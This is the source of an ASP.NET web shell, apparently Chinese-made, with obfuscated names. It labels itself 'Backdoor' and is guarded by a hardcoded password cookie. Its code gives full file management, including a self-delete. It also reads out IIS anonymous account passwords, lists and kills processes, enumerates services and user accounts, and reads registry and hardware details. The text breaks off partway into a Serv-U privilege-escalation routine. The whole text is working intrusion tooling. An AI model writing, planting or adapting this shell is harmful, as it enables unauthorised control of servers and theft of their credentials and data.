<%@ Page Language="C#" Debug="true" trace="false" validateRequest="false" EnableViewStateMac="false" EnableViewState="true"%>
<%@ import Namespace="System.IO"%>
<%@ import Namespace="System.Diagnostics"%>
<%@ import Namespace="System.Data"%>
<%@ import Namespace="System.Management"%>
<%@ import Namespace="System.Data.OleDb"%>
<%@ import Namespace="Microsoft.Win32"%>
<%@ import Namespace="System.Net.Sockets" %>
<%@ import Namespace="System.Net" %>
<%@ import Namespace="System.Runtime.InteropServices"%>
<%@ import Namespace="System.DirectoryServices"%>
<%@ import Namespace="System.ServiceProcess"%>
<%@ import Namespace="System.Text.RegularExpressions"%>
<%@ Import Namespace="System.Threading"%>
<%@ Import Namespace="System.Data.SqlClient"%>
<%@ import Namespace="Microsoft.VisualBasic"%>
<%@ Assembly Name="System.DirectoryServices,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A"%>
<%@ Assembly Name="System.Management,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A"%>
<%@ Assembly Name="System.ServiceProcess,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A"%>
<%@ Assembly Name="Microsoft.VisualBasic,Version=7.0.3300.0,Culture=neutral,PublicKeyToken=b03f5f7f11d50a3a"%>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<script runat="server">
public string Password="bdbca288fee7f92f2bfa9f7012727740";
public string vbhLn="Backdoor";
public int TdgGU=1;
protected OleDbConnection Dtdr=new OleDbConnection();
protected OleDbCommand Kkvb=new OleDbCommand();
public NetworkStream NS=null;
public NetworkStream NS1=null;
TcpClient tcp=new TcpClient();
TcpClient zvxm=new TcpClient();
ArrayList IVc=new ArrayList();
protected void Page_load(object sender,EventArgs e)
{
YFcNP(this);
fhAEn();
if (!pdo())
{
return;
}
if(IsPostBack)
{
string tkI=Request["__EVENTTARGET"];
string VqV=Request["__File"];
if(tkI!="")
{
switch(tkI)
{
case "Bin_Parent":
krIR(Ebgw(VqV));
break;
case "Bin_Listdir":
krIR(Ebgw(VqV));
break;
case "kRXgt":
kRXgt(Ebgw(VqV));
break;
case "Bin_Createfile":
gLKc(VqV);
break;
case "Bin_Editfile":
gLKc(VqV);
break;
case "Bin_Createdir":
stNPw(VqV);
break;
case "cYAl":
cYAl(VqV);
break;
case "ksGR":
ksGR(Ebgw(VqV));
break;
case "SJv":
SJv(VqV);
break;
case "Bin_Regread":
tpRQ(Ebgw(VqV));
break;
case "hae":
hae();
break;
case "urJG":
urJG(VqV);
break;
}
if(tkI.StartsWith("dAJTD"))
{
dAJTD(Ebgw(tkI.Replace("dAJTD","")),VqV);
}
else if(tkI.StartsWith("Tlvz"))
{
Tlvz(Ebgw(tkI.Replace("Tlvz","")),VqV);
}
else if(tkI.StartsWith("Bin_CFile"))
{
YByN(Ebgw(tkI.Replace("Bin_CFile","")),VqV);
}
}
}
else
{
PBZw();
}
}
public bool pdo()
{
if(Request.Cookies[vbhLn]==null)
{
tZSx();
return false;
}
else
{
if (Request.Cookies[vbhLn].Value != Password)
{
tZSx();
return false;
}
else
{
return true;
}
}
}
public void tZSx()
{
ljtzC.Visible=true;
ZVS.Visible=false;
}
protected void YKpI(object sender,EventArgs e)
{
Session.Abandon();
Response.Cookies.Add(new HttpCookie(vbhLn,null));
tZSx();
}
public void PBZw()
{
ZVS.Visible=true;
ljtzC.Visible=false;
Bin_Button_CreateFile.Attributes["onClick"]="var filename=prompt('Please input the file name:','');if(filename){Bin_PostBack('Bin_Createfile',filename);}";
Bin_Button_CreateDir.Attributes["onClick"]="var filename=prompt('Please input the directory name:','');if(filename){Bin_PostBack('Bin_Createdir',filename);}";
Bin_Button_KillMe.Attributes["onClick"]="if(confirm('确定要自杀?')){Bin_PostBack('hae','');};";
Bin_Span_Sname.InnerHtml=Request.ServerVariables["LOCAL_ADDR"]+":"+Request.ServerVariables["SERVER_PORT"]+"("+Request.ServerVariables["SERVER_NAME"]+")";
Bin_Span_FrameVersion.InnerHtml="Framework Ver : "+Environment.Version.ToString();
if (AXSbb.Value==string.Empty)
{
AXSbb.Value=OElM(Server.MapPath("."));
}
Bin_H2_Title.InnerText="文件(夹)管理 >>";
krIR(AXSbb.Value);
}
public void fhAEn()
{
try
{
string[] YRgt=Directory.GetLogicalDrives();
for(int i=0;i<YRgt.Length;i++)
{
Control c=ParseControl(" <asp:LinkButton Text='"+mFvj(YRgt[i])+"' ID=\"Bin_Button_Driv"+i+"\" runat='server' commandargument= '"+YRgt[i]+"'/> | ");
Bin_Span_Drv.Controls.Add(c);
LinkButton nxeDR=(LinkButton)Page.FindControl("Bin_Button_Driv"+i);
nxeDR.Command+=new CommandEventHandler(this.iVk);
}
}catch(Exception ex){}
}
public string OElM(string path)
{
if(path.Substring(path.Length-1,1)!=@"\")
{
path=path+@"\";
}
return path;
}
public string nrrx(string path)
{
char[] trim={'\\'};
if(path.Substring(path.Length-1,1)==@"\")
{
path=path.TrimEnd(trim);
}
return path;
}
[DllImport("kernel32.dll",EntryPoint="GetDriveTypeA")]
public static extern int OMZP(string nDrive);
public string mFvj(string instr)
{
string EuXD=string.Empty;
int num=OMZP(instr);
switch(num)
{
case 1:
EuXD="Unknow("+instr+")";
break;
case 2:
EuXD="Removable("+instr+")";
break;
case 3:
EuXD="磁盘("+instr+")";
break;
case 4:
EuXD="Network("+instr+")";
break;
case 5:
EuXD="CDRom("+instr+")";
break;
case 6:
EuXD="RAM Disk("+instr+")";
break;
}
return EuXD.Replace(@"\","");
}
public string MVVJ(string instr)
{
byte[] tmp=Encoding.Default.GetBytes(instr);
return Convert.ToBase64String(tmp);
}
public string Ebgw(string instr)
{
byte[] tmp=Convert.FromBase64String(instr);
return Encoding.Default.GetString(tmp);
}
public void krIR(string path)
{
WICxe();
CzfO.Visible=true;
Bin_H2_Title.InnerText="文件(夹)管理 >>";
AXSbb.Value=OElM(path);
DirectoryInfo GQMM=new DirectoryInfo(path);
if(Directory.GetParent(nrrx(path))!=null)
{
string bg=OKM();
TableRow p=new TableRow();
for(int i=1;i<6;i++)
{
TableCell pc=new TableCell();
if(i==1)
{
pc.Width=Unit.Parse("2%");
pc.Text="<font face='wingdings' size='4'>0</font>";
p.CssClass=bg;
}
if(i==2)
{
pc.Text="<a href=\"javascript:Bin_PostBack('Bin_Parent','"+MVVJ(Directory.GetParent(nrrx(path)).ToString())+"')\">Parent Directory</a>";
}
p.Cells.Add(pc);
UGzP.Rows.Add(p);
}
}
try
{
int vLlH=0;
foreach(DirectoryInfo Bin_folder in GQMM.GetDirectories())
{
string bg=OKM();
vLlH++;
TableRow tr=new TableRow();
TableCell tc=new TableCell();
tc.Width=Unit.Parse("2%");
tc.Text="<font face='wingdings' size='4'>0</font>";
tr.Attributes["onmouseover"]="this.className='focus';";
tr.CssClass=bg;
tr.Attributes["onmouseout"]="this.className='"+bg+"';";
tr.Cells.Add(tc);
TableCell HczyN=new TableCell();
HczyN.Text="<a href=\"javascript:Bin_PostBack('Bin_Listdir','"+MVVJ(AXSbb.Value+Bin_folder.Name)+"')\">"+Bin_folder.Name+"</a>";
tr.Cells.Add(HczyN);
TableCell LYZK=new TableCell();
LYZK.Text=Bin_folder.LastWriteTimeUtc.ToString("yyyy-MM-dd hh:mm:ss");
tr.Cells.Add(LYZK);
UGzP.Rows.Add(tr);
TableCell ERUL=new TableCell();
ERUL.Text="--";
tr.Cells.Add(ERUL);
UGzP.Rows.Add(tr);
TableCell ZGKh=new TableCell();
ZGKh.Text="<a href=\"javascript:if(confirm('确定要删除此文件(夹) ?')){Bin_PostBack('kRXgt','"+MVVJ(AXSbb.Value+Bin_folder.Name)+"')};\">删除</a> | <a href='#' onclick=\"var filename=prompt('请输入文件夹名称:','"+AXSbb.Value.Replace(@"\",@"\\")+Bin_folder.Name.Replace("'","\\'")+"');if(filename){Bin_PostBack('dAJTD"+MVVJ(AXSbb.Value+Bin_folder.Name)+"',filename);} \">重命名</a>";
tr.Cells.Add(ZGKh);
UGzP.Rows.Add(tr);
}
TableRow cKVA=new TableRow();
cKVA.Attributes["style"]="border-top:1px solid #fff;border-bottom:1px solid #ddd;";
cKVA.Attributes["bgcolor"]="#dddddd";
TableCell JlmW=new TableCell();
JlmW.Attributes["colspan"]="6" ;
JlmW.Attributes["height"]="5";
cKVA.Cells.Add(JlmW);
UGzP.Rows.Add(cKVA);
int aYRwo=0;
foreach(FileInfo Bin_Files in GQMM.GetFiles())
{
aYRwo++;
string gb=OKM();
TableRow tr=new TableRow();
TableCell tc=new TableCell();
tc.Width=Unit.Parse("2%");
tc.Text="<input type=\"checkbox\" value=\"0\" name=\""+MVVJ(Bin_Files.Name)+"\">";
tr.Attributes["onmouseover"]="this.className='focus';";
tr.CssClass=gb;
tr.Attributes["onmouseout"]="this.className='"+gb+"';";
tr.Cells.Add(tc);
TableCell filename=new TableCell();
if(Bin_Files.FullName.StartsWith(Request.PhysicalApplicationPath))
{
string url=Request.Url.ToString();
filename.Text="<a href=\""+Bin_Files.FullName.Replace(Request.PhysicalApplicationPath,url.Substring(0,url.IndexOf('/',8)+1)).Replace("\\","/")+"\" target=\"_blank\">"+Bin_Files.Name+"</a>";
}
else
{
filename.Text=Bin_Files.Name;
}
TableCell albt=new TableCell();
albt.Text=Bin_Files.LastWriteTimeUtc.ToString("yyyy-MM-dd hh:mm:ss");
TableCell YzK=new TableCell();
YzK.Text=mTG(Bin_Files.Length);
TableCell GLpi=new TableCell();
GLpi.Text="<a href=\"#\" onclick=\"Bin_PostBack('ksGR','"+MVVJ(AXSbb.Value+Bin_Files.Name)+"')\">下载</a> | <a href='#' onclick=\"var filename=prompt('请输入新的文件名:','"+AXSbb.Value.Replace(@"\",@"\\")+Bin_Files.Name.Replace("'","\\'")+"');if(filename){Bin_PostBack('Bin_CFile"+MVVJ(AXSbb.Value+Bin_Files.Name)+"',filename);} \">复制</a> | <a href=\"#\" onclick=\"Bin_PostBack('Bin_Editfile','"+Bin_Files.Name+"')\">编辑</a> | <a href='#' onclick=\"var filename=prompt('请输入新的文件名:','"+AXSbb.Value.Replace(@"\",@"\\")+Bin_Files.Name.Replace("'","\\'")+"');if(filename){Bin_PostBack('Tlvz"+MVVJ(AXSbb.Value+Bin_Files.Name)+"',filename);} \">重命名</a> | <a href=\"#\" onclick=\"Bin_PostBack('cYAl','"+Bin_Files.Name+"')\">修改文件属性</a> ";
tr.Cells.Add(filename);
tr.Cells.Add(albt);
tr.Cells.Add(YzK);
tr.Cells.Add(GLpi);
UGzP.Rows.Add(tr);
}
string lgb=OKM();
TableRow oWam=new TableRow();
oWam.CssClass=lgb;
for(int i=1;i<4;i++)
{
TableCell lGV=new TableCell();
if(i==1)
{
lGV.Text="<input name=\"chkall\" value=\"on\" type=\"checkbox\" onclick=\"var ck=document.getElementsByTagName('input');for(var i=0;i<ck.length-1;i++){if(ck[i].type=='checkbox'&&ck[i].name!='chkall'){ck[i].checked=forms[0].chkall.checked;}}\"/>";
}
if(i==2)
{
lGV.Text="<a href=\"#\" Onclick=\"var d_file='';var ck=document.getElementsByTagName('input');for(var i=0;i<ck.length-1;i++){if(ck[i].checked&&ck[i].name!='chkall'){d_file+=ck[i].name+',';}};if(d_file==null || d_file==''){ return;} else {if(confirm('Are you sure delete the files ?')){Bin_PostBack('SJv',d_file)};}\">Delete selected</a>";
}
if(i==3)
{
lGV.ColumnSpan=4;
lGV.Style.Add("text-align","right");
lGV.Text=vLlH+" 文件夹/ "+aYRwo+" 文件";
}
oWam.Cells.Add(lGV);
}
UGzP.Rows.Add(oWam);
}
catch(Exception error)
{
xseuB(error.Message);
}
}
public string OKM()
{
TdgGU++;
if(TdgGU % 2==0)
{
return "alt1";
}
else
{
return "alt2";
}
}
public void kRXgt(string qcKu)
{
try
{
Directory.Delete(qcKu,true);
xseuB("Directory delete new success !");
}
catch(Exception error)
{
xseuB(error.Message);
}
krIR(Directory.GetParent(qcKu).ToString());
}
public void dAJTD(string sdir,string ddir)
{
try
{
Directory.Move(sdir,ddir);
xseuB("Directory Renamed Success !");
}
catch(Exception error)
{
xseuB(error.Message);
}
krIR(AXSbb.Value);
}
public void Tlvz(string sfile,string dfile)
{
try
{
File.Move(sfile,dfile);
xseuB("File Renamed Success !");
}
catch(Exception error)
{
xseuB(error.Message);
}
krIR(AXSbb.Value);
}
public void YByN(string spath,string dpath)
{
try
{
File.Copy(spath,dpath);
xseuB("File Copy Success !");
}
catch(Exception error)
{
xseuB(error.Message);
}
krIR(AXSbb.Value);
}
public void stNPw(string path)
{
try
{
Directory.CreateDirectory(AXSbb.Value+path);
xseuB("Directory created success !");
}
catch(Exception error)
{
xseuB(error.Message);
}
krIR(AXSbb.Value);
}
public void gLKc(string path)
{
if(Request["__EVENTTARGET"]=="Bin_Editfile" || Request["__EVENTTARGET"]=="Bin_Createfile")
{
foreach(ListItem item in NdCX.Items)
{
if(item.Selected=true)
{
item.Selected=false;
}
}
}
Bin_H2_Title.InnerHtml="创建/编辑文件 >>";
WICxe();
vrFA.Visible=true;
if(path.IndexOf(":")< 0)
{
Sqon.Value=AXSbb.Value+path;
}
else
{
Sqon.Value=path;
}
if(File.Exists(Sqon.Value))
{
StreamReader sr;
if(NdCX.SelectedItem.Text=="UTF-8")
{
sr=new StreamReader(Sqon.Value,Encoding.UTF8);
}
else
{
sr=new StreamReader(Sqon.Value,Encoding.Default);
}
Xgvv.InnerText=sr.ReadToEnd();
sr.Close();
}
else
{
Xgvv.InnerText=string.Empty;
}
}
public void ksGR(string path)
{
FileInfo fs=new FileInfo(path);
Response.Clear();
Page.Response.ClearHeaders();
Page.Response.Buffer=false;
this.EnableViewState=false;
Response.AddHeader("Content-Disposition","attachment;filename="+HttpUtility.UrlEncode(fs.Name,System.Text.Encoding.UTF8));
Response.AddHeader("Content-Length",fs.Length.ToString());
Page.Response.ContentType="application/unknown";
Response.WriteFile(fs.FullName);
Page.Response.Flush();
Page.Response.Close();
Response.End();
Page.Response.Clear();
}
public void SJv(string path)
{
try
{
string[] spdT=path.Split(',');
for(int i=0;i<spdT.Length-1;i++)
{
File.Delete(AXSbb.Value+Ebgw(spdT[i]));
}
xseuB("File Delete Success !");
}
catch(Exception error)
{
xseuB(error.Message);
}
krIR(AXSbb.Value);
}
public void hae()
{
try
{
File.Delete(Request.PhysicalPath);

}
catch(Exception error)
{
xseuB(error.Message);
}
}
public void cYAl(string path)
{
Bin_H2_Title.InnerHtml="克隆文件的最后修改时间 >>";
WICxe();
zRyG.Visible=true;
QiFB.Value=AXSbb.Value+path;
lICp.Value=AXSbb.Value;
pWVL.Value=AXSbb.Value+path;
string Att=File.GetAttributes(QiFB.Value).ToString();
if(Att.LastIndexOf("ReadOnly")!=-1)
{
ZhWSK.Checked=true;
}
if(Att.LastIndexOf("System")!=-1)
{
SsR.Checked=true;
}
if(Att.LastIndexOf("Hidden")!=-1)
{
ccB.Checked=true;
}
if(Att.LastIndexOf("Archive")!=-1)
{
fbyZ.Checked=true;
}
yUqx.Value=File.GetCreationTimeUtc(pWVL.Value).ToString();
uYjw.Value=File.GetLastWriteTimeUtc(pWVL.Value).ToString();
aLsn.Value=File.GetLastAccessTimeUtc(pWVL.Value).ToString();
}
public static String mTG(Int64 fileSize)
{
if(fileSize<0)
{
throw new ArgumentOutOfRangeException("fileSize");
}
else if(fileSize >= 1024 * 1024 * 1024)
{
return string.Format("{0:########0.00} G",((Double)fileSize)/(1024 * 1024 * 1024));
}
else if(fileSize >= 1024 * 1024)
{
return string.Format("{0:####0.00} M",((Double)fileSize)/(1024 * 1024));
}
else if(fileSize >= 1024)
{
return string.Format("{0:####0.00} K",((Double)fileSize)/ 1024);
}
else
{
return string.Format("{0} B",fileSize);
}
}
private bool SGde(string sSrc)
{
Regex reg=new Regex(@"^0|[0-9]*[1-9][0-9]*$");
if(reg.IsMatch(sSrc))
{
return true;
}
else
{
return false;
}
}
public void AdCx()
{
string qcKu=string.Empty;
string mWGEm="IIS://localhost/W3SVC";
GlI.Style.Add("word-break","break-all");
try
{
DirectoryEntry HHzcY=new DirectoryEntry(mWGEm);
int fmW=0;
foreach(DirectoryEntry child in HHzcY.Children)
{
if(SGde(child.Name.ToString()))
{
fmW++;
DirectoryEntry newdir=new DirectoryEntry(mWGEm+"/"+child.Name.ToString());
DirectoryEntry HlyU=newdir.Children.Find("root","IIsWebVirtualDir");
string bg=OKM();
TableRow TR=new TableRow();
TR.Attributes["onmouseover"]="this.className='focus';";
TR.CssClass=bg;
TR.Attributes["onmouseout"]="this.className='"+bg+"';";
TR.Attributes["title"]="Site:"+child.Properties["ServerComment"].Value.ToString();
for(int i=1;i<6;i++)
{
try
{
TableCell tfit=new TableCell();
switch(i)
{case 1:
tfit.Text=fmW.ToString();
break;
case 2:
tfit.Text=HlyU.Properties["AnonymousUserName"].Value.ToString();
break;
case 3:
tfit.Text=HlyU.Properties["AnonymousUserPass"].Value.ToString();
break;
case 4:
StringBuilder sb=new StringBuilder();
PropertyValueCollection pc=child.Properties["ServerBindings"];
for (int j=0; j < pc.Count; j++)
{
sb.Append(pc[j].ToString()+"<br>");
}
tfit.Text=sb.ToString().Substring(0,sb.ToString().Length-4);
break;
case 5:
tfit.Text="<a href=\"javascript:Bin_PostBack('Bin_Listdir','"+MVVJ(HlyU.Properties["Path"].Value.ToString())+"')\">"+HlyU.Properties["Path"].Value.ToString()+"</a>";
break;
}
TR.Cells.Add(tfit);
}
catch (Exception ex)
{
xseuB(ex.Message);
continue;
}
}
GlI.Controls.Add(TR);
}
}
}
catch(Exception ex)
{
xseuB(ex.Message);
}
}
public ManagementObjectCollection PhQTd(string query)
{
ManagementObjectSearcher QS=new ManagementObjectSearcher(new SelectQuery(query));
return QS.Get();
}
public DataTable cCf(string query)
{
DataTable dt=new DataTable();
int i=0;
ManagementObjectSearcher QS=new ManagementObjectSearcher(new SelectQuery(query));
try
{
foreach(ManagementObject m in QS.Get())
{
DataRow dr=dt.NewRow();
PropertyDataCollection.PropertyDataEnumerator oEnum;
oEnum=(m.Properties.GetEnumerator()as PropertyDataCollection.PropertyDataEnumerator);
while(oEnum.MoveNext())
{
PropertyData DRU=(PropertyData)oEnum.Current;
if(dt.Columns.IndexOf(DRU.Name)==-1)
{
dt.Columns.Add(DRU.Name);
dt.Columns[dt.Columns.Count-1].DefaultValue="";
}
if(m[DRU.Name]!=null)
{
dr[DRU.Name]=m[DRU.Name].ToString();
}
else
{
dr[DRU.Name]=string.Empty;
}
}
dt.Rows.Add(dr);
}
}
catch(Exception error)
{
}
return dt;
}
public void YUw()
{
try
{
Bin_H2_Title.InnerText="系统进程 >>";
WICxe();
DCbS.Visible=true;
int UEbTI=0;
Process[] p=Process.GetProcesses();
foreach(Process sp in p)
{
UEbTI++;
string bg=OKM();
TableRow tr=new TableRow();
tr.Attributes["onmouseover"]="this.className='focus';";
tr.CssClass=bg;
tr.Attributes["onmouseout"]="this.className='"+bg+"';";
for(int i=1;i<7;i++)
{
TableCell td=new TableCell();
if(i==1)
{
td.Width=Unit.Parse("2%");
td.Text=UEbTI.ToString();
tr.Controls.Add(td);
}
if(i==2)
{
td.Text=sp.Id.ToString();
tr.Controls.Add(td);
}
if(i==3)
{
td.Text=sp.ProcessName.ToString();
tr.Controls.Add(td);
}
if(i==4)
{
td.Text=sp.Threads.Count.ToString();
tr.Controls.Add(td);
}
if(i==5)
{
td.Text=sp.BasePriority.ToString();
tr.Controls.Add(td);
}
if(i==6)
{
td.Text="--";
tr.Controls.Add(td);
}
}
IjsL.Controls.Add(tr);
}
}
catch(Exception error)
{
AIz();
}
AIz();
}
public void AIz()
{
try
{
Bin_H2_Title.InnerText="系统进程 >>";
WICxe();
DCbS.Visible=true;
int UEbTI=0;
DataTable dt=cCf("Win32_Process");
for(int j=0;j<dt.Rows.Count;j++)
{
UEbTI++;
string bg=OKM();
TableRow tr=new TableRow();
tr.Attributes["onmouseover"]="this.className='focus';";
tr.CssClass=bg;
tr.Attributes["onmouseout"]="this.className='"+bg+"';";
for(int i=1;i<7;i++)
{
TableCell td=new TableCell();
if(i==1)
{
td.Width=Unit.Parse("2%");
td.Text=UEbTI.ToString();
tr.Controls.Add(td);
}
if(i==2)
{
td.Text=dt.Rows[j]["ProcessID"].ToString();
tr.Controls.Add(td);
}
if(i==3)
{
td.Text=dt.Rows[j]["Name"].ToString();
tr.Controls.Add(td);
}
if(i==4)
{
td.Text=dt.Rows[j]["ThreadCount"].ToString();
tr.Controls.Add(td);
}
if(i==5)
{
td.Text=dt.Rows[j]["Priority"].ToString();
tr.Controls.Add(td);
}
if(i==6)
{
if( dt.Rows[j]["CommandLine"]!=string.Empty)
{
td.Text="<a href=\"javascript:Bin_PostBack('urJG','"+dt.Rows[j]["ProcessID"].ToString()+"')\">Kill</a>";
}
else
{
td.Text="--";
}
tr.Controls.Add(td);
}
}
IjsL.Controls.Add(tr);
}
}
catch(Exception error)
{
xseuB(error.Message);
}
}
public void urJG(string pid)
{
try
{
foreach(ManagementObject p in PhQTd("Select * from Win32_Process Where ProcessID ='"+pid+"'"))
{
p.InvokeMethod("Terminate",null);
p.Dispose();
}
xseuB("Process Kill Success !");
}
catch(Exception error)
{
xseuB(error.Message);
}
AIz();
}
public void oHpF()
{
try
{
Bin_H2_Title.InnerText="系统服务 >>";
WICxe();
iQxm.Visible=true;
int UEbTI=0;
ServiceController[] kQmRu=System.ServiceProcess.ServiceController.GetServices();
for(int i=0;i<kQmRu.Length;i++)
{
UEbTI++;
string bg=OKM();
TableRow tr=new TableRow();
tr.Attributes["onmouseover"]="this.className='focus';";
tr.CssClass=bg;
tr.Attributes["onmouseout"]="this.className='"+bg+"';";
for(int b=1;b<7;b++)
{
TableCell td=new TableCell();
if(b==1)
{
td.Width=Unit.Parse("2%");
td.Text=UEbTI.ToString();
tr.Controls.Add(td);
}
if(b==2)
{
td.Text="null";
tr.Controls.Add(td);
}
if(b==3)
{
td.Text=kQmRu[i].ServiceName.ToString();
tr.Controls.Add(td);
}
if(b==4)
{
td.Text="";
tr.Controls.Add(td);
}
if(b==5)
{
string kOIo=kQmRu[i].Status.ToString();
if(kOIo=="Running")
{
td.Text="<font color=green>"+kOIo+"</font>";
}
else
{
td.Text="<font color=red>"+kOIo+"</font>";
}
tr.Controls.Add(td);
}
if(b==6)
{
td.Text="";
tr.Controls.Add(td);
}
}
vHCs.Controls.Add(tr);
}
}
catch(Exception error)
{
xseuB(error.Message);
}
}
public void tZRH()
{
try
{
Bin_H2_Title.InnerText="系统服务 >>";
WICxe();
iQxm.Visible=true;
int UEbTI=0;
DataTable dt=cCf("Win32_Service");
for(int j=0;j<dt.Rows.Count;j++)
{
UEbTI++;
string bg=OKM();
TableRow tr=new TableRow();
tr.Attributes["onmouseover"]="this.className='focus';";
tr.CssClass=bg;
tr.Attributes["onmouseout"]="this.className='"+bg+"';";
tr.Attributes["title"]=dt.Rows[j]["Description"].ToString();
for(int i=1;i<7;i++)
{
TableCell td=new TableCell();
if(i==1)
{
td.Width=Unit.Parse("2%");
td.Text=UEbTI.ToString();
tr.Controls.Add(td);
}
if(i==2)
{
td.Text=dt.Rows[j]["ProcessID"].ToString();
tr.Controls.Add(td);
}
if(i==3)
{
td.Text=dt.Rows[j]["Name"].ToString();
tr.Controls.Add(td);
}
if(i==4)
{
td.Text=dt.Rows[j]["PathName"].ToString();
tr.Controls.Add(td);
}
if(i==5)
{
string kOIo=dt.Rows[j]["State"].ToString();
if(kOIo=="Running")
{
td.Text="<font color=green>"+kOIo+"</font>";
}
else
{
td.Text="<font color=red>"+kOIo+"</font>";
}
tr.Controls.Add(td);
}
if(i==6)
{
td.Text=dt.Rows[j]["StartMode"].ToString();
tr.Controls.Add(td);
}
}
vHCs.Controls.Add(tr);
}
}
catch(Exception error)
{
oHpF();
}
}
public void PLd()
{
try
{
WICxe();
xWVQ.Visible=true;
Bin_H2_Title.InnerText="用户(组)信息 >>";
DirectoryEntry TWQ=new DirectoryEntry("WinNT://"+Environment.MachineName.ToString());
foreach(DirectoryEntry child in TWQ.Children)
{
foreach(string name in child.Properties.PropertyNames)
{
PropertyValueCollection pvc=child.Properties[name];
int c=pvc.Count;
for(int i=0;i<c;i++)
{
if(name!="objectSid" && name!="Parameters" && name!="LoginHours")
{
string bg=OKM();
TableRow tr=new TableRow();
tr.Attributes["onmouseover"]="this.className='focus';";
tr.CssClass=bg;
tr.Attributes["onmouseout"]="this.className='"+bg+"';";
TableCell td=new TableCell();
td.Text=name;
tr.Controls.Add(td);
TableCell td1=new TableCell();
td1.Text=pvc[i].ToString();
tr.Controls.Add(td1);
VPa.Controls.Add(tr);
}
}
}
TableRow trn=new TableRow();
for(int x=1;x<3;x++)
{
TableCell tdn=new TableCell();
tdn.Attributes["style"]="height:2px;background-color:#bbbbbb;";
trn.Controls.Add(tdn);
VPa.Controls.Add(trn);
}
}
}
catch(Exception error)
{
xseuB(error.Message);
}
}
public void iLVUT()
{
try
{
WICxe();
xWVQ.Visible=true;
Bin_H2_Title.InnerText="用户(组)信息 >>";
DataTable user=cCf("Win32_UserAccount");
for(int i=0;i<user.Rows.Count;i++)
{
for(int j=0;j<user.Columns.Count;j++)
{
string bg=OKM();
TableRow tr=new TableRow();
tr.Attributes["onmouseover"]="this.className='focus';";
tr.CssClass=bg;
tr.Attributes["onmouseout"]="this.className='"+bg+"';";
TableCell td=new TableCell();
td.Text=user.Columns[j].ToString();
tr.Controls.Add(td);
TableCell td1=new TableCell();
td1.Text=user.Rows[i][j].ToString();
tr.Controls.Add(td1);
VPa.Controls.Add(tr);
}
TableRow trn=new TableRow();
for(int x=1;x<3;x++)
{
TableCell tdn=new TableCell();
tdn.Attributes["style"]="height:2px;background-color:#bbbbbb;";
trn.Controls.Add(tdn);
VPa.Controls.Add(trn);
}
}
}
catch(Exception error)
{
PLd();
}
}
public void pDVM()
{
try
{
RegistryKey EeZ=Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp");
string IKjwH=DdmPl(EeZ,"PortNumber");
RegistryKey izN=Registry.LocalMachine.OpenSubKey(@"HARDWARE\DESCRIPTION\System\CentralProcessor");
int cpu=izN.SubKeyCount;
RegistryKey mQII=Registry.LocalMachine.OpenSubKey(@"HARDWARE\DESCRIPTION\System\CentralProcessor\0\");
string NPPZ=DdmPl(mQII,"ProcessorNameString");
WICxe();
ghaB.Visible=true;
Bin_H2_Title.InnerText="系统信息 >>";
Bin_H2_Mac.InnerText="网卡信息 >>";
Bin_H2_Driver.InnerText="驱动信息 >>";
StringBuilder yEwc=new StringBuilder();
StringBuilder hwJeS=new StringBuilder();
StringBuilder jXkaE=new StringBuilder();
yEwc.Append("<li><u>Server Domain : </u>"+Request.ServerVariables["SERVER_NAME"]+"</li>");
yEwc.Append("<li><u>Server Ip : </u>"+Request.ServerVariables["LOCAL_ADDR"]+":"+Request.ServerVariables["SERVER_PORT"]+"</li>");
yEwc.Append("<li><u>Terminal Port : </u>"+IKjwH+"</li>");
yEwc.Append("<li><u>Server OS : </u>"+Environment.OSVersion+"</li>");
yEwc.Append("<li><u>Server Software : </u>"+Request.ServerVariables["SERVER_SOFTWARE"]+"</li>");
yEwc.Append("<li><u>Server UserName : </u>"+Environment.UserName+"</li>");
yEwc.Append("<li><u>Server Time : </u>"+System.DateTime.Now.ToString()+"</li>");
yEwc.Append("<li><u>Server TimeZone : </u>"+cCf("Win32_TimeZone").Rows[0]["Caption"]+"</li>");
DataTable BIOS=cCf("Win32_BIOS");
yEwc.Append("<li><u>Server BIOS : </u>"+BIOS.Rows[0]["Manufacturer"]+" : "+BIOS.Rows[0]["Name"]+"</li>");
yEwc.Append("<li><u>CPU Count : </u>"+cpu.ToString()+"</li>");
yEwc.Append("<li><u>CPU Version : </u>"+NPPZ+"</li>");
DataTable upM=cCf("Win32_PhysicalMemory");
Int64 oZnZV=0;
for(int i=0;i<upM.Rows.Count;i++)
{
oZnZV+=Int64.Parse(upM.Rows[0]["Capacity"].ToString());
}
yEwc.Append("<li><u>Server upM : </u>"+mTG(oZnZV)+"</li>");
DataTable dOza=cCf("Win32_NetworkAdapterConfiguration");
for(int i=0;i<dOza.Rows.Count;i++)
{
hwJeS.Append("<li><u>Server MAC"+i+" : </u>"+dOza.Rows[i]["Caption"]+"</li>");
if(dOza.Rows[i]["MACAddress"]!=string.Empty)
{
hwJeS.Append("<li style=\"list-style:none;\"><u>Address : </u>"+dOza.Rows[i]["MACAddress"]+"</li>");
}
}
DataTable Driver=cCf("Win32_SystemDriver");
for (int i=0; i<Driver.Rows.Count; i++)
{
jXkaE.Append("<li><u class='u1'>Server Driver"+i+" : </u><u class='u2'>"+Driver.Rows[i]["Caption"]+"</u> ");
if (Driver.Rows[i]["PathName"]!=string.Empty)
{
jXkaE.Append("Path : "+Driver.Rows[i]["PathName"]);
}
else
{
jXkaE.Append("No path information");
}
jXkaE.Append("</li>");
}
Bin_Ul_Sys.InnerHtml=yEwc.ToString();
Bin_Ul_NetConfig.InnerHtml=hwJeS.ToString();
Bin_Ul_Driver.InnerHtml=jXkaE.ToString();
}
catch(Exception error)
{
xseuB(error.Message);
}
}
public void ADCpk()
{
WICxe();
APl.Visible=true;
Bin_H2_Title.InnerText="Serv-U 提权 >>";
}
public void lDODR()
{
string JGGg=string.Empty;
string user=dNohJ.Value;
string pass=NMd.Value;
int port=Int32.Parse(HlQl.Value);
string cmd=mHbjB.Value;
string CRtK="user "+user+"\r\n";
string jnNG="pass "+pass+"\r\n";
string site="SITE MAINTENANCE\r\n";
